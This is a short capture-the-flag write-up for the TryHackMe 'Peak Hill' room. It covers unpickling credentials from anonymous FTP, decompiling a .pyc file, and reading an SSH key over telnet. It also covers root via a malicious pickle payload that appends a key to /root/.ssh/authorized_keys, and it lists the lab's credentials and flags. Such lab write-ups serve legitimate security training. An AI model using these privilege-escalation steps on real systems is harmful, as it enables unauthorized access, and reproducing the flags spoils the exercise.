---
title: Peak Hill
description: 'Decompiling a Python script (pyc) and exploiting a Python pickle script'
pubDate: 2020-06-12
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/1bd570868d5c18425b3d1876460c06ba.jpeg'
---

## FTP anon login
    - .creds (user_pass.py)
        - Binary to ascii
        - unpickle
        - sort ssh_user<number> and ssh_pass<number>
            gherkin
            p1ckl3s_@11_@r0und_th3_w0rld

## USER
    - cmd_service.pyc <- from home dir
    - decompiled: uncompyle6 cmd_service.pyc > cmd_service.py
        - interestings parts:
            username = long_to_bytes(1684630636)
            password = long_to_bytes(2457564920124666544827225107428488864802762356)
    - creds: cmd_service_creds.py
        dill
        n3v3r_@_d1ll_m0m3nt

    - telnet 10.10.12.136 7321
        - cat /home/dill/user.txt
        f1e13335c47306e193212c98fc07b6a0

## DILL USER
    - telnet 10.10.12.136 7321
        - cat /home/dill/.ssh/id_rsa

## ROOT
    - ssh -i dill_id_rsa dill@10.10.12.136
    - sudo -l: (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
    - pickle + base64 -> create code execution
    - copy pickle rsa key to /home/dill as pickle.txt, append it to /root/.ssh/authorized_keys
    - python3 ../grow.py "cat /home/dill/pickle.txt >> /root/.ssh/authorized_keys"
    - ssh -i pickle root@10.10.12.136

## ROOT.TXT
    - root.txt has invisible character appended to it:
        - cat /root/* <- hint is in the /home/dill/.bash_history
        e88f0a01135c05cf0912cf4bc335ee28

    - OR with dill user:
        - python3 grow.py "cat /root/*"
        - sudo /opt/peak_hill_farm/peak_hill_farm <- paste base64 output as 'to grow:'

